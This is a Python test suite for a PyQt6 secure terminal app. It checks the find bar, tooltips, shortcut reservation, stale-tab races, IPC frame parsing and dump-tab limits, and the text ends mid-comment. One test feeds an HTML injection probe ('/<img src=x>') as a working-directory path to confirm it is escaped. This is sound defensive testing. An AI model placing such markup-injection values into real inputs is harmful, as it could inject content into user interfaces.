#!/usr/bin/python3 -Bsu
## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

## main() -- boundary + WM options, find bar, status-bar notices, _set_shortcuts cases, tab-op guards, ctl dump-tab, InfoTip, the marker/tooltip fixes, IPC read-path frames, assorted window/icon helpers, _apply_global locks, save-unwritable warn, _open_path, the font-noise handler, main() SIGCHLD-fail, fonts, paste/copy warn modes, the review risk lamp and review bar.
##
## One of the MainWindow / ctl suites split out of the former single 5300-line
## test_mainwin.py. Shared setup, the global dialog/modal stubs, the font-DB
## stubs, the helpers and the pass/fail counters all live in
## test_mainwin_common; see it for the split rationale (fresh window + fresh
## monkeypatch baselines per suite eliminate cross-suite ordering deps). This
## suite builds its OWN MainWindow and reports via finish().

from test_mainwin_common import *          # noqa: F401,F403

win = MainWindow()
win.new_tab()

# Imported/aliased once in sections that now live in earlier suites.
import io as _io                                 # noqa: E402
import contextlib as _ctx                        # noqa: E402
from PyQt6.QtWidgets import QFileDialog, QPushButton  # noqa: E402
from PyQt6.QtCore import Qt, QPoint              # noqa: E402
from PyQt6.QtCore import Qt as _QtIL             # noqa: E402
from PyQt6.QtGui import QDesktopServices as _QDS  # noqa: E402

# --- main(): the -- boundary and the WM name/class startup options ------------
_o_argv2 = sys.argv[:]
_o_sr3 = M.ipc.send_request
_o_qa2 = M.QApplication
_o_qexec2 = QApplication.exec
_o_chld2 = __import__('signal').getsignal(__import__('signal').SIGCHLD)
try:
    # --test-canary AFTER a `--` belongs to the child and is NOT fired
    M.ipc.send_request = lambda *_a, **_k: None


    class _AP2:
        def __call__(self, _a):
            return APP

        def __getattr__(self, _n):
            return getattr(QApplication, _n)

    M.QApplication = _AP2()
    M.QFontDatabase = _FontDBPresent    # startup is font-independent here
    QApplication.exec = lambda _s: 0
    sys.argv = ['secure-terminal', '--new-instance', '--name', 'wmname',
                '--class', 'wmclass']
    eq(M.main(), 0, 'main: --name/--class set the WM name/class during startup')
    # a `--` before --test-canary means the canary belongs to the child command
    sys.argv = ['secure-terminal', '--new-instance', '--', '--test-canary']
    ok(M.main() == 0, 'main: --test-canary after -- is left to the child')
    # the missing-default-font wiring: main() -> `if not _require_default_font():
    # return 1`. Asserted here (after the threaded handoff test) on purpose -- see
    # the note in the font block above.
    M.QFontDatabase = _FontDBAbsent
    sys.argv = ['secure-terminal', '--new-instance', '--title', 'nofont']
    with _ctx.redirect_stderr(_io.StringIO()):
        eq(M.main(), 1, 'font: main() exits 1 when the default font is missing')
    M.QFontDatabase = _FontDBPresent
finally:
    sys.argv = _o_argv2
    M.ipc.send_request = _o_sr3
    M.QApplication = _o_qa2
    M.QFontDatabase = _REAL_QFONTDB
    QApplication.exec = _o_qexec2
    __import__('signal').signal(__import__('signal').SIGCHLD, _o_chld2)

# --- find bar: all-tabs and single-tab search + stepping ----------------------
while win.tabs.count() < 2:
    win.new_tab()
win.show_find()
win._find_bar.all_tabs.setChecked(True)
win._find_bar.input.setText('e')
win._find_update()                          # all-tabs, with a query
win._find_bar.input.setText('')
win._find_update()                          # all-tabs, no query
win._find_bar.input.setText('zzz-no-such-match')
win._find_update()                          # all-tabs, no matches
win._find_bar.all_tabs.setChecked(False)
win._find_bar.input.setText('e')
win._find_update()                          # single-tab, with a query
win._find_step(False)
win._find_step(True)                        # backward, wrap
win._find_bar.input.setText('')
win._find_step(False)                       # no query -> return
ok(True, 'find bar: all-tabs and single-tab search + stepping run')

# --- status-bar notifications, bell label, tray bell, cwd tooltip -------------
win._on_notify('a notification')
win._default_bell_sound = '/usr/share/sounds/example.wav'
ok('Sound file:' in win._bell_sound_label(), '_bell_sound_label names the file')
win._default_bell_sound = ''
_bt = win.current()
win._on_bell_tray(_bt, 'label')
win._on_cwd_changed(_bt, '/tmp/some/where')  # nosec B108 -- literal path string arg to a handler under test; nothing is created
ok(True, 'notification, bell-tray and cwd-changed handlers run')
# SEC-2: the OSC-7 cwd tooltip must be html-escaped (setTabToolTip renders rich text), or
# a cwd path could inject markup -- the sibling _refresh_tab_label already escapes.
win._on_cwd_changed(_bt, '/<img src=x>')  # nosec B108 -- literal handler arg, nothing created
_cwdtip = win.tabs.tabToolTip(win.tabs.indexOf(_bt))
ok('<img' not in _cwdtip and '&lt;img' in _cwdtip,
   'SEC-2: an OSC-7 cwd path is html-escaped in the tab tooltip (no raw markup)')

# --- _set_shortcuts: a reserved key, a duplicate, and an unknown ident ---------
_ids = list(win._shortcuts)[:2]
_probs = win._set_shortcuts({_ids[0]: 'Ctrl+C',           # reserved terminal key
                             _ids[1]: 'Ctrl+G',
                             'no-such-ident': 'Ctrl+H'})   # unknown -> skipped
ok(isinstance(_probs, list)
   and any('reserved for the terminal' in _p for _p in _probs),
   '_set_shortcuts: a reserved key (Ctrl+C) is reported by name (real detection, not the lock guard)')
_dup = win._set_shortcuts({_ids[0]: 'Ctrl+J', _ids[1]: 'Ctrl+J'})   # duplicate
ok(isinstance(_dup, list)
   and any('assigned to more than one action' in _p for _p in _dup),
   '_set_shortcuts: a duplicate binding is reported (real duplicate detection)')

# --- tab-op guards on invalid targets -----------------------------------------
from PyQt6.QtGui import QColor as _QC        # noqa: E402
win.rename_tab(-1)                           # index < 0 -> return (no dialog)
win.set_tab_color(-1, _QC('#ff0000'))        # index < 0 -> return
win.zoom_reset()                             # -> set_zoom(100)
_other = MainWindow()
_other.new_tab()
win._refresh_tab_label(_other.tabs.widget(0))  # a term not in this window -> return
_other.deleteLater()
APP.processEvents()
ok(True, 'tab-op guards on invalid targets are no-ops')

# _pick_custom_tab_color stale-index across the modal (same class as rename/save, but a
# wrong-TARGET not a crash): the colour picker is modal, and a background tab's shell can
# exit during it, shifting indices. The captured index must be re-resolved from the TARGET
# term after the modal, or set_tab_color colours the tab now at the stale index. Uses a
# THROWAWAY window (torn down here) so the tab churn never reaches the suite teardown.
from PyQt6.QtWidgets import QColorDialog        # noqa: E402
_pcw = MainWindow()
_pcw._persist_session = False
while _pcw.tabs.count() < 4:
    _pcw.new_tab()
_pc_bg = _pcw.tabs.widget(0)                     # a lower-index background tab
_pc_target = _pcw.tabs.widget(2)                 # the tab the picker is opened for
_pc_extra = _pcw.tabs.widget(3)                  # ends up at the stale index 2 after the close
_pc_bg.has_foreground_program = lambda: False    # close_tab needs no confirm
_pc_bg.shutdown = lambda: None                    # stub only the tab closed mid-modal
def _pick_closes_bg(*_a, **_k):
    _pcw.close_tab(_pcw.tabs.indexOf(_pc_bg))     # index 0 exits -> 2 shifts to 1, 3 to 2
    APP.processEvents()
    return _QC('#123456')
_ogc = QColorDialog.getColor
try:
    QColorDialog.getColor = staticmethod(_pick_closes_bg)
    _pcw._pick_custom_tab_color(2)               # stale index 2 now points at _pc_extra
finally:
    QColorDialog.getColor = _ogc
ok(_pcw._tab_colors.get(_pc_target) == '#123456',
   '_pick_custom_tab_color: the colour lands on the target tab, not the stale index')
ok(_pcw._tab_colors.get(_pc_extra) != '#123456',
   '_pick_custom_tab_color: the tab now at the stale index is not mis-coloured')
while _pcw.tabs.count() > 0:                      # reap the survivors' ptys, then drop it
    _pcw.close_tab(0)
_pcw.deleteLater()
APP.processEvents()

# _on_clipboard_read_requested stale-term across the modal (HIGH -- whole-app crash): a
# program asks to read the clipboard (OSC 52) then its shell exits during the request
# dialog; _on_shell_exited->close_tab frees term, then grant_clipboard_read on the dead
# QObject aborts the WHOLE app. The _tab_is_live guard must skip the grant if the tab
# closed. Throwaway window; mock QDialog.exec to kill the tab from inside the modal.
from PyQt6.QtWidgets import QDialog                # noqa: E402
_crw = MainWindow()
_crw._persist_session = False
_cr_term = _crw.current()
_cr_term.has_foreground_program = lambda: False   # close_tab needs no confirm
_cr_term.shutdown = lambda: None                   # stub only the tab closed mid-modal
_cr_calls = []
_cr_term.grant_clipboard_read = lambda d: _cr_calls.append(d)   # spy: must NOT be called
_oexec = QDialog.exec
def _exec_kills_tab(_self):
    _crw.close_tab(_crw.tabs.indexOf(_cr_term))    # the tab's shell exits mid-dialog
    APP.processEvents()                            # let deleteLater free it
    return 0
try:
    QDialog.exec = _exec_kills_tab
    _crw._on_clipboard_read_requested(_cr_term)    # must NOT crash, must NOT grant
finally:
    QDialog.exec = _oexec
ok(_cr_calls == [],
   '_on_clipboard_read_requested: a tab closed during the dialog is not granted (no crash)')
while _crw.tabs.count() > 0:
    _crw.close_tab(0)
_crw.deleteLater()
APP.processEvents()

# --- ctl: dump-tab tail-cap, an unknown ctl op --------------------------------
if win.tabs.count() == 0:
    win.new_tab()
_t0b = win.tabs.widget(0)
_tid0b = win._tab_ids.get(_t0b)
# Isolate from prior-test pollution on this SHARED tab: a WIDE winsize so the test
# string cannot soft-wrap mid-word, and a LEADING NEWLINE to end any partial input a
# prior test left on the current line. Without both, the last line was only the
# wrapped tail (e.g. 'of text' when a prior 'echo' + a narrow width wrapped
# 'echohello world of text' mid-word) -- the offscreen ordering flake that passed in
# isolation but failed under the full-suite ordering.
_t0b._set_winsize(200, 50)
_t0b._append('\nhello world of text')
# COR-7: --lines 0 must dump ZERO lines, not the whole tab. The server's `lines > 0` guard
# defaulted 0 to a full dump, and text.split('\n')[-0:] is the WHOLE list (negative-zero).
_rl0 = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b, 'lines': 0})
ok(_rl0['ok'] and _rl0['text'] == '',
   'COR-7: ctl-dump-tab lines=0 dumps zero lines, not the full tab')
_rl1 = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b, 'lines': 1})
ok(_rl1['ok'] and 'hello world of text' in _rl1['text'],
   'COR-7: ctl-dump-tab lines=1 still dumps the last line')
# --lines N with N > available must return ALL lines. Base used [-lines:] (correct for N>len);
# the len=0 fix regressed it to parts[len-lines:] -- a negative start returning only the last
# (lines-len) lines. Multi-line tab, request one more than it has -> all lines, not just one.
_t0b._append('\nCANARY-DUMP-L2\nCANARY-DUMP-L3')
_parts_now = _t0b.toPlainText().split('\n')
_rlN = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b, 'lines': len(_parts_now) + 1})
ok(_rlN['ok'] and _rlN['text'].split('\n') == _parts_now,
   'COR-7: ctl-dump-tab --lines > available returns ALL lines, not just the last')
# bool is an int subclass: lines=true must be REJECTED (full dump), not sliced as lines=1.
_rlb = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b, 'lines': True})
ok(_rlb['ok'] and _rlb['text'].split('\n') == _parts_now,
   'COR-7: ctl-dump-tab lines=true (bool) is rejected -> full dump, not lines=1')
_o_dumpmax = M._DUMP_MAX
try:
    M._DUMP_MAX = 4                          # force the tail-cap branch
    _rr = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b})
    ok(_rr['ok'] and len(_rr['text']) <= 4, 'ctl dump-tab tail-caps to _DUMP_MAX')
finally:
    M._DUMP_MAX = _o_dumpmax
# F4: dump-tab bounds the ENCODED frame, not the character count -- non-ASCII expands
# ~6x under json.dumps(ensure_ascii), so a char cap alone could overflow the IPC frame
# and the client would drop it. Force a tiny frame cap + non-ASCII content past it.
import secure_terminal.ipc as _ipc4              # noqa: E402
import json as _json4                            # noqa: E402
_o_maxreq = _ipc4._MAX_REQUEST
try:
    _ipc4._MAX_REQUEST = 200
    _t0b._append('\u2603' * 200)             # snowmen: ~6 encoded bytes each
    _r4 = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b})
    ok(_r4['ok'], 'F4: dump-tab succeeds even when the raw text overflows the frame')
    ok(len(_json4.dumps(_r4).encode('utf-8')) <= _ipc4._MAX_REQUEST,
       'F4: the dump-tab reply is bounded by the ENCODED frame, not the char count')
finally:
    _ipc4._MAX_REQUEST = _o_maxreq
ok(not win._ipc_ctl('ctl-bogus', {})['ok'], 'ctl: an unknown ctl op is rejected')

# --- InfoTip: hide when the pointer is away, and a hard-destroyed source -------
from PyQt6 import sip                                           # noqa: E402
_tip2 = M.InfoTip(win)
_probe2 = MainWindow()
_tip2.show_for(_probe2, 'x', 100, 'light')
sip.delete(_probe2)                          # force-destroy the C++ source object
_tip2._check_pointer()                        # mapToGlobal raises RuntimeError -> caught
_tip2.hide()
_tip2._source = None
_tip2._check_pointer()                        # not over tip or source -> hide + stop
ok(_tip2._source is None, 'InfoTip: a destroyed source is handled and it hides')
# regression: a long tip at a high zoom must NOT be clipped (the wrapped last line
# used to vanish), and the tip must not be maximizable full-screen (max size capped
# to content, so a WM maximize is a no-op and the pointer poll can still hide it)
_longtip = ('The monospace font family used for the terminal grid. The default Hack '
            'avoids confusable glyphs and has no ligatures. Applies to every tab.')
_tip2.show_for(win, _longtip, 300, 'light')
ok(_tip2.height() >= _tip2.heightForWidth(_tip2.width()),
   'InfoTip: a long tip at high zoom fits its wrapped text (not clipped)')
ok(_tip2.maximumSize() == _tip2.size(),
   'InfoTip: max size is capped to content, so a WM maximize is a no-op')
_tip_running = _tip2._poll.isActive()
_tip2.close()
ok(_tip_running and not _tip2._poll.isActive(),
   'InfoTip: closeEvent stops the pointer poll')
_tip2.deleteLater()
APP.processEvents()

# --- #95: a settings (i) marker is a CLICK target that pops the copyable InfoTip
from PyQt6.QtCore import Qt as _Qt95, QEvent as _QEvent95       # noqa: E402
# The (i) marker is a LINK, so the label TEXT stays selectable for copy; ACTIVATING the
# link (not clicking anywhere on the label) pops the tip and toggles it on the next.
_il = M._InfoLabel('Theme ' + M._InfoLabel._MARK, 'the theme risk explanation', win)
ok('href="tip"' in _il.text()
   and bool(_il.textInteractionFlags() & _Qt95.TextInteractionFlag.LinksAccessibleByMouse),
   '#95: the info (i) marker is a clickable link (the click target)')
_il.linkActivated.emit('tip')
_iltip = win._tip_filter._tip
ok(_iltip.isVisible() and 'theme risk explanation' in _iltip.text(),
   '#95: activating an (i) marker shows the copyable InfoTip with the row help')
_iltip.hide()
_iltip._poll.stop()

# --- #132: a second activation of the SAME (i) marker toggles the tip closed ----
_il.linkActivated.emit('tip')
ok(_iltip.isVisible(), '#132: first activation re-opens the InfoTip')
_il.linkActivated.emit('tip')
ok(not _iltip.isVisible(),
   '#132: a second activation of the same marker hides it (toggle)')
_iltip._poll.stop()

# --- #130: the View > Paste delay check-mark follows the current delay ---------
win.set_paste_delay(5)                            # a preset -> that entry checks
ok(win._paste_delay_actions[5].isChecked()
   and not win._paste_delay_actions[0].isChecked(),
   '#130: setting a preset paste delay checks that menu entry')
win.set_paste_delay(7)                            # not a preset -> none checked
ok(not any(a.isChecked() for a in win._paste_delay_actions.values()),
   '#130: a custom paste delay leaves every menu entry unchecked')
win.set_paste_delay(3)                            # restore the default preset

# --- #128: menu hints are left to Qt's native tooltip (stacks above the popup);
# a non-menu widget still gets the copyable tool-window InfoTip -----------------
from PyQt6.QtWidgets import QMenu as _QMenu128                  # noqa: E402
from PyQt6.QtGui import QHelpEvent as _QHelpEvent128            # noqa: E402
_menu128 = _QMenu128(win)
_menu128.addAction('X').setToolTip('menu hint')
_he128 = _QHelpEvent128(_QEvent95.Type.ToolTip, QPoint(1, 1), QPoint(1, 1))
win._tip_filter._tip.hide()
win._tip_filter.eventFilter(_menu128, _he128)     # QMenu -> left to Qt
ok(not win._tip_filter._tip.isVisible(),
   '#128: a menu ToolTip is left to Qt, not shown as the tool-window InfoTip')
_wtip128 = M.QLabel('x', win)
_wtip128.setToolTip('row help 128')
ok(win._tip_filter.eventFilter(_wtip128, _he128)
   and win._tip_filter._tip.isVisible(),
   '#128: a non-menu widget still shows the copyable InfoTip')
win._tip_filter._tip.hide()
win._tip_filter._tip._poll.stop()

# the tool-window InfoTip text stays SELECTABLE + copyable after the minimal-crisp
# restyle (the style change must never drop the interaction flags), and carries the
# crisp look (4px radius) + the theme card colours.
_tipsel = M.InfoTip(win)
_tipsel.show_for(win, 'selectable tip text', 100, 'dark')
_selflags = _tipsel.textInteractionFlags()
ok(bool(_selflags & _QtIL.TextInteractionFlag.TextSelectableByMouse)
   and bool(_selflags & _QtIL.TextInteractionFlag.TextSelectableByKeyboard),
   'InfoTip text is selectable by mouse + keyboard (copyable)')
ok('border-radius:4px' in _tipsel.styleSheet(),
   'InfoTip uses the minimal-crisp 4px radius')
_tc_bg, _tc_fg, _ = M._TIP_COLORS['dark']
ok(_tc_bg in _tipsel.styleSheet() and _tc_fg in _tipsel.styleSheet(),
   'InfoTip paints the theme card colours (bg + fg)')
_tipsel.hide()
_tipsel._poll.stop()

# --- _set_shortcuts skips an unknown ident in the apply loop ------------------
ok(isinstance(win._set_shortcuts({'unknown-x': ''}), list),
   '_set_shortcuts: an unknown ident is skipped')

# --- _find_tab / ctl-ls skip a stale term no longer in the tab bar ------------
from secure_terminal.terminal import SecureTerminal             # noqa: E402
_stale = SecureTerminal(command='/bin/cat')
win._tab_ids[_stale] = 987654
ok(win._find_tab('id:987654') is None, '_find_tab: a stale tab id is skipped')
ok(win._ipc_ctl('ctl-ls', {})['ok'], 'ctl-ls: a stale tab entry is skipped')
win._tab_ids.pop(_stale, None)
_stale.shutdown()

# --- the shortcuts dialog surfaces a save problem in a warning box -------------
# (no leftover-lock clear needed: the locked-keybindings block above restores it)
assert 'keybindings' not in win._locked, 'keybindings lock leaked into later tests'
_o_ss = win._set_shortcuts
_o_w2 = QMessageBox.warning
_warned = []
QMessageBox.warning = staticmethod(lambda *_a, **_k: _warned.append(1))
win._set_shortcuts = lambda _m: ['a problem']


def _exec_save_bad(self):
    for _b in self.findChildren(QPushButton):
        if _b.text() == 'Save':
            _b.click()                       # _do_save -> problems -> warning
    return int(QDialog.DialogCode.Rejected)


_o_ex = QDialog.exec
QDialog.exec = _exec_save_bad
try:
    win.show_shortcuts()
    ok(_warned, 'show_shortcuts: an invalid save surfaces a warning box')
finally:
    QDialog.exec = _o_ex
    win._set_shortcuts = _o_ss
    QMessageBox.warning = _o_w2

# --- the bell-sound picker accepts a file inside an allowed dir ----------------
import secure_terminal.terminal as _term2                       # noqa: E402
_snddir = tempfile.mkdtemp()
_sndfile = os.path.join(_snddir, 'bell.wav')
with open(_sndfile, 'wb') as _sf3b:
    _sf3b.write(b'RIFF....WAVE')
_o_dirs = _term2.BELL_SOUND_DIRS
_o_gof3 = QFileDialog.getOpenFileName
_o_bsl = win._bell_sound_locked
try:
    _term2.BELL_SOUND_DIRS = (_snddir,)
    QFileDialog.getOpenFileName = staticmethod(lambda *_a, **_k: (_sndfile, ''))
    win._bell_sound_locked = lambda: False
    _accepted_bell = []
    _o_setbell2 = win.set_bell_sound
    win.set_bell_sound = lambda p: _accepted_bell.append(p)
    try:
        win._pick_bell_sound()                # allowed -> set_bell_sound(_sndfile)
    finally:
        win.set_bell_sound = _o_setbell2
    ok(_accepted_bell == [_sndfile],
       '_pick_bell_sound: a file inside an allowed dir is accepted (set_bell_sound called)')
finally:
    _term2.BELL_SOUND_DIRS = _o_dirs
    QFileDialog.getOpenFileName = _o_gof3
    win._bell_sound_locked = _o_bsl

# --- the IPC server read path: malformed / partial / valid frames -------------
# Driven with fake conns (see the handoff note): the server-side Framer + on_ready branches
# (over-long -> abort, partial -> buffered, valid -> framed reply, spurious -> no-op) run
# with no live socket dispatch. The same sequence over a REAL cross-recv socket -- the
# server surviving a malformed+partial frame and still serving a valid one without desync --
# is covered by the subprocess test_instances.
import struct as _struct                                        # noqa: E402
_frwin = MainWindow()
# an over-long length makes the server-side Framer raise -> the connection aborts
_fr_bad = _FakeConn()
_frwin._server = _FakeServer(_fr_bad)
_frwin._on_instance_connection()
_fr_bad.feed(_struct.pack('<I', (1 << 20) + 5) + b'xxxxx')
ok(_fr_bad.aborted, 'IPC server: an over-long frame aborts the connection')
# a header promising more than it sends leaves the frame incomplete (payload None)
_fr_part = _FakeConn()
_frwin._server = _FakeServer(_fr_part)
_frwin._on_instance_connection()
_fr_part.feed(_struct.pack('<I', 100) + b'short')
ok(_fr_part.written == b'' and not _fr_part.aborted,
   'IPC server: a partial frame is buffered, not answered or aborted')
# a VALID request still gets a framed reply (no desync from the malformed / partial ones)
_fr_ok = _FakeConn()
_frwin._server = _FakeServer(_fr_ok)
_frwin._on_instance_connection()
_fr_ok.feed(M.ipc.frame(b'{"op": "ping"}'))
ok(len(_fr_ok.written) > 4 and b'"ok"' in _fr_ok.written,
   'IPC server: after a malformed + partial frame, a valid request still gets a framed reply')
_frwin._server = _FakeServer(None)
_frwin._on_instance_connection()             # nextPendingConnection None -> harmless no-op
ok(True, 'IPC server: a spurious newConnection with nothing pending is a harmless no-op')
_frwin.deleteLater()
APP.processEvents()

# --- assorted window helpers --------------------------------------------------
import signal as _sg                                            # noqa: E402
from PyQt6.QtGui import QTextCursor                             # noqa: E402
while win.tabs.count() < 2:
    win.new_tab()
win._goto_tab(0)                             # start at the first tab so a broken clamp is visible
win._goto_tab(8)                             # Alt+9 -> clamp to the last tab
ok(win.tabs.currentIndex() == win.tabs.count() - 1,
   '_goto_tab: Alt+9 (index 8) clamps to the LAST tab')
win._goto_tab(0)
ok(win.tabs.currentIndex() == 0, '_goto_tab(0): jumps to the first tab')
# terminate_foreground routes to the CURRENT tab's terminal only (spy both, expect just current)
_tf0 = win.tabs.widget(0)
_tf1 = win.tabs.widget(1)
_tf_hits = []
_tf0_orig = _tf0.terminate_foreground
_tf0.terminate_foreground = lambda: _tf_hits.append(0)
_tf_spy1 = isinstance(_tf1, SecureTerminal)
if _tf_spy1:
    _tf1_orig = _tf1.terminate_foreground
    _tf1.terminate_foreground = lambda: _tf_hits.append(1)
try:
    win.terminate_foreground()               # current tab is 0
    eq(_tf_hits, [0], 'terminate_foreground routes to the current tab, not another')
finally:
    _tf0.terminate_foreground = _tf0_orig
    if _tf_spy1:
        _tf1.terminate_foreground = _tf1_orig
# a 'bell' admin lock makes _update_bell_tray_action a no-op: the lock wins and it never
# re-enables the tray channel past the admin lock (guards the admin-lock-bypass class)
_bell_act = win._bell_actions['tray']
_sl3 = set(win._locked)
_bell_prev = _bell_act.isEnabled()
try:
    _bell_act.setEnabled(not win._systray)   # sentinel: opposite of what an UNLOCKED update forces
    win._locked = {'bell'}
    win._update_bell_tray_action()           # bell locked -> no-op
    ok(_bell_act.isEnabled() == (not win._systray),
       '_update_bell_tray_action: a bell lock is a no-op (does not override the admin lock)')
finally:
    win._locked = _sl3
    _bell_act.setEnabled(_bell_prev)
ok(win._is_reserved_shortcut('') is False, '_is_reserved_shortcut: empty -> False')
# #7: a shortcut rebound to a MODIFIED cursor/Home/End key (forwarded as ESC[1;p<final>)
# or to Ctrl+<punctuation> (a C0 control byte) must be reserved -- else it shadows the key
# for a TUI program. These all read False on the pre-fix code (bare nav + Ctrl+letter only).
for _rk in ('Ctrl+End', 'Shift+Home', 'Alt+Left',
            'Ctrl+[', 'Ctrl+]', 'Ctrl+\\', 'Ctrl+Space'):
    ok(win._is_reserved_shortcut(_rk),
       '_is_reserved_shortcut: %s is reserved (forwarded to the program)' % _rk)
# keyPressEvent routes every Ctrl+Shift combo to the window shortcuts, never the child, so
# Ctrl+Shift+<nav> and Ctrl+Shift+<letter> both stay available to rebind (not reserved).
for _ak in ('Ctrl+Shift+T', 'Ctrl+Shift+End'):
    ok(not win._is_reserved_shortcut(_ak),
       '_is_reserved_shortcut: %s stays available (routed to a window shortcut)' % _ak)
_o_sig5 = _sg.signal
try:
    _sg.signal = lambda *_a, **_k: (_ for _ in ()).throw(ValueError())
    M._install_signal_quit(APP)              # every signal.signal raises -> tolerated
    ok(True, '_install_signal_quit tolerates an unsettable signal')
finally:
    _sg.signal = _o_sig5

# show_find: no-tab guard, and seeding from a single-line selection
_nf2 = MainWindow()
while _nf2.tabs.count():
    _nf2.tabs.removeTab(0)
_nf2.show_find()                             # no current tab -> return
_nf2.deleteLater()
APP.processEvents()
_sf2 = win.current()
_sf2._append('SEEDLINE')
_tc = _sf2.textCursor()
_tc.movePosition(QTextCursor.MoveOperation.End)
_tc.movePosition(QTextCursor.MoveOperation.StartOfLine, QTextCursor.MoveMode.KeepAnchor)
_sf2.setTextCursor(_tc)                      # select the last line only
win.show_find()                              # a single-line selection seeds the query
ok('SEEDLINE' in win._find_bar.input.text(),
   'show_find seeds the query from a single-line selection')

# current_zoom_percent + _ipc_open bare reuse on a tab-less window
_zw2 = MainWindow()
while _zw2.tabs.count():
    _zw2.tabs.removeTab(0)
ok(_zw2.current_zoom_percent() == getattr(_zw2, '_default_zoom', 100),
   'current_zoom_percent: the default with no tab')
ok(_zw2.current_theme_key() == getattr(_zw2, '_default_theme', 'light'),
   'current_theme_key: the default theme with no tab')
_zw2._ipc_open({})                           # nothing to open -> ensure a usable tab
ok(_zw2.tabs.count() >= 1, 'ipc open with nothing still leaves a usable tab')
_zw2.deleteLater()
APP.processEvents()

# a window built with the tray enabled shows the tray icon at startup
_cfgd3 = os.path.join(os.environ['XDG_CONFIG_HOME'], 'secure-terminal.d')
os.makedirs(_cfgd3, exist_ok=True)
_trayconf = os.path.join(_cfgd3, '70-tray.conf')
with open(_trayconf, 'w', encoding='utf-8') as _tf:
    _tf.write('systray=true\n')
_wt2 = MainWindow()
# The actual QSystemTrayIcon cannot build under offscreen (no system tray), so assert
# the real read-back that IS deterministic: the systray=true config was honored.
ok(_wt2._systray is True,
   'a window with systray=true reads the tray-enable config (tray armed at startup)')
_wt2.deleteLater()
APP.processEvents()
os.remove(_trayconf)

# --- InfoTip: pointer polling, a destroyed source, and Esc-to-hide ------------
_tip = M.InfoTip(win)
_probe_w = MainWindow()
# _check_pointer hides when the pointer is over NEITHER the tip nor its source. Make
# that deterministic offscreen: move the tip far from the (0,0-ish) cursor and drop
# the source, so both the over-tip and over-source checks are false.
_tip.show_for(_probe_w, 'inspect', 100, 'light')
_tip.move(9000, 9000)
_tip._source = None
_tip._check_pointer()
ok(not _tip.isVisible(),
   'InfoTip: _check_pointer hides once the pointer is over neither tip nor source')
# a destroyed source is CAUGHT (RuntimeError on mapToGlobal), cleared to None, and,
# with the tip off the cursor, the tip hides -- not a crash. sip.delete force-destroys
# the C++ source NOW so mapToGlobal reliably raises (deleteLater is too lazy offscreen).
from PyQt6 import sip as _sip                                   # noqa: E402
_tip.show_for(_probe_w, 'inspect', 100, 'light')
_tip.move(9000, 9000)
_sip.delete(_probe_w)
_tip._check_pointer()
ok(not _tip.isVisible() and _tip._source is None,
   'InfoTip: a destroyed source is caught (source cleared, no crash) and the tip hides')
from PyQt6.QtGui import QKeyEvent as _QKE2                       # noqa: E402
from PyQt6.QtCore import QEvent as _QEv2                         # noqa: E402
_tip.show_for(win, 'inspect', 100, 'light')
_tip.keyPressEvent(_QKE2(_QEv2.Type.KeyPress, Qt.Key.Key_Escape,
                         Qt.KeyboardModifier.NoModifier, ''))    # Esc -> hide
ok(not _tip.isVisible(), 'InfoTip: Esc hides the tip')
_tip.show_for(win, 'inspect', 100, 'light')
_tip.keyPressEvent(_QKE2(_QEv2.Type.KeyPress, Qt.Key.Key_A,
                         Qt.KeyboardModifier.NoModifier, 'a'))   # other -> super, stays up
ok(_tip.isVisible(), 'InfoTip: a non-Esc key does not hide the tip (passed to super)')
_tip.deleteLater()
APP.processEvents()

# --- show_find seeds from a single-line selection -----------------------------
if win.tabs.count() == 0:
    win.new_tab()
_sf = win.current()
# Build a DETERMINISTIC two-line document (a prior output line + the query line) so the
# selection spans a block boundary regardless of whether the child shell has printed a
# prompt yet. The old code relied on selectAll() picking up a prompt line, which races
# the child in offscreen CI -- there selectAll yielded a single-line 'findmetext' (no
# U+2029), so show_find SEEDED and this assert tripped.
_sfc = _sf.textCursor()
_sfc.movePosition(QTextCursor.MoveOperation.End)
_sfc.insertText('previous output')
_sfc.insertBlock()
_sfc.insertText('findmetext')
_sf.selectAll()                              # spans two blocks -> U+2029 -> MULTI-line
ok('\u2029' in _sf.textCursor().selectedText(),
   'precondition: the selection genuinely spans multiple lines (U+2029 present)')
win._find_bar.input.setText('')             # clear any prior seed
win.show_find()
ok(win._find_bar.input.text() == '',
   'show_find does NOT seed from a multi-line selection (the paragraph-separator guard)')

# --- _find_step wraps within a tab, and returns with no current tab -----------
win._find_bar.all_tabs.setChecked(False)
win._find_bar.input.setText('findmetext')
from PyQt6.QtGui import QTextCursor                              # noqa: E402
_sf.moveCursor(QTextCursor.MoveOperation.End)
win._find_step(False)                        # not found ahead -> wrap to start
win._find_step(True)                         # backward wrap
_zf = MainWindow()
while _zf.tabs.count():
    _zf.tabs.removeTab(0)
_zf._find_bar.input.blockSignals(True)        # avoid _find_update with no tab
_zf._find_bar.input.setText('x')
_zf._find_bar.input.blockSignals(False)
_zf._find_step(False)                         # no current tab in the wrap branch
ok(True, '_find_step wraps within a tab and is safe with no current tab')
_zf.deleteLater()
APP.processEvents()

# --- _set_shortcuts: a valid mapping with an unknown ident is skipped ----------
_r2 = win._set_shortcuts({'no-such-ident': 'Ctrl+Alt+Z'})
ok(isinstance(_r2, list), '_set_shortcuts: an unknown ident is skipped in the apply loop')

# --- icon helpers: themed hit, null-icon fallback, toolbar-toggle theme hit ----
from PyQt6.QtGui import QIcon                                    # noqa: E402
_o_fromtheme = QIcon.fromTheme
try:
    QIcon.fromTheme = staticmethod(lambda *_a, **_k: M._letter_icon('X', '#111111'))
    ok(not _REAL_APP_ICON().isNull(), '_app_icon: a themed icon is used when present')
    ok(not M._toggle_icon('x', 'Y', '#222222').isNull(),
       '_toggle_icon: the desktop theme symbol is used when present')
    QIcon.fromTheme = staticmethod(lambda *_a, **_k: QIcon())    # null theme icon
    # the theme lacks the symbol -> _toggle_icon draws the letter-chip fallback
    ok(not M._toggle_icon('x', 'Y', '#222222').isNull(),
       '_toggle_icon: draws the letter-chip fallback when the theme lacks the symbol')
    # regression: with no theme icon, _app_icon resolves the shipped SVG and MUST build a
